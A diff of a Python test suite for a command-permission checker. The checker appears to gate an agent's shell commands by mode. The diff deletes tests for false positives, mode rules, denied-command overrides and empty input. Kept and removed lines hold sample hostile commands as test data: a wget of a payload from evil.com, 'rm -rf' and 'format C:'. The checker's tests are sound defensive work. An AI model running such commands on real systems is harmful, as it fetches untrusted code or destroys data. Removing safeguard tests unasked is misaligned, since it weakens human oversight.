@@ -65,14 +65,6 @@ class TestShellInjectionDetection:
     def test_safe_commands_not_flagged(self, command: str) -> None:
         assert PermissionChecker._is_dangerous_command(command) is False
 
-    def test_no_false_positive_rm_substring(self) -> None:
-        """'perform_rm_analysis' contains 'rm' but is not a dangerous command."""
-        assert PermissionChecker._is_dangerous_command("perform_rm_analysis") is False
-
-    def test_no_false_positive_curl_substring(self) -> None:
-        """'info --curl-option' contains 'curl' but is not a dangerous command."""
-        assert PermissionChecker._is_dangerous_command("info --curl-option value") is False
-
     def test_wget_detected(self) -> None:
         assert PermissionChecker._is_dangerous_command("wget http://evil.com/payload") is True
 
@@ -86,38 +78,6 @@ class TestShellInjectionDetection:
 # ======================================================================
 # B) check_command() mode behavior
 # ======================================================================
-
-
-class TestCheckCommandModeBehavior:
-    """check_command() mode-based rules: DEFAULT, PLAN, FULL_AUTO."""
-
-    def test_default_dangerous_requires_confirmation(self) -> None:
-        """DEFAULT mode: dangerous command is allowed but requires confirmation."""
-        checker = _checker(mode=PermissionMode.DEFAULT)
-        d = checker.check_command("rm -rf /tmp/old")
-        assert d.allowed is True
-        assert d.requires_confirmation is True
-
-    def test_default_safe_allowed_no_confirmation(self) -> None:
-        """DEFAULT mode: safe command is allowed without confirmation."""
-        checker = _checker(mode=PermissionMode.DEFAULT)
-        d = checker.check_command("echo hello")
-        assert d.allowed is True
-        assert d.requires_confirmation is False
-
-    def test_plan_mode_denies_all_commands(self) -> None:
-        """PLAN mode: all commands are denied, even safe ones."""
-        checker = _checker(mode=PermissionMode.PLAN)
-        d = checker.check_command("echo hello")
-        assert d.allowed is False
-        assert "PLAN" in d.reason
-
-    def test_full_auto_allows_all_commands(self) -> None:
-        """FULL_AUTO mode: all commands are allowed without confirmation."""
-        checker = _checker(mode=PermissionMode.FULL_AUTO)
-        d = checker.check_command("rm -rf /tmp/old")
-        assert d.allowed is True
-        assert d.requires_confirmation is False
 
 
 # ======================================================================
@@ -157,43 +117,3 @@ class TestDeniedCommands:
         d = checker.check_command("echo hello")
         assert d.allowed is True
 
-    def test_denied_commands_override_full_auto(self) -> None:
-        """denied_commands take priority even in FULL_AUTO mode."""
-        checker = _checker(
-            mode=PermissionMode.FULL_AUTO,
-            denied_commands=["format"],
-        )
-        d = checker.check_command("format C:")
-        assert d.allowed is False
-
-    def test_denied_commands_substring_match(self) -> None:
-        """denied_commands use substring matching."""
-        checker = _checker(
-            mode=PermissionMode.FULL_AUTO,
-            denied_commands=["dangerous"],
-        )
-        d = checker.check_command("some dangerous command")
-        assert d.allowed is False
-
-
-# ======================================================================
-# D) Edge cases
-# ======================================================================
-
-
-class TestCheckCommandEdgeCases:
-    """Edge cases for check_command()."""
-
-    def test_empty_command_denied(self) -> None:
-        """Empty string command is denied."""
-        checker = _checker(mode=PermissionMode.FULL_AUTO)
-        d = checker.check_command("")
-        assert d.allowed is False
-        assert "Empty command" in d.reason
-
-    def test_whitespace_only_command_denied(self) -> None:
-        """Whitespace-only command is denied."""
-        checker = _checker(mode=PermissionMode.FULL_AUTO)
-        d = checker.check_command("   ")
-        assert d.allowed is False
-        assert "Empty command" in d.reason
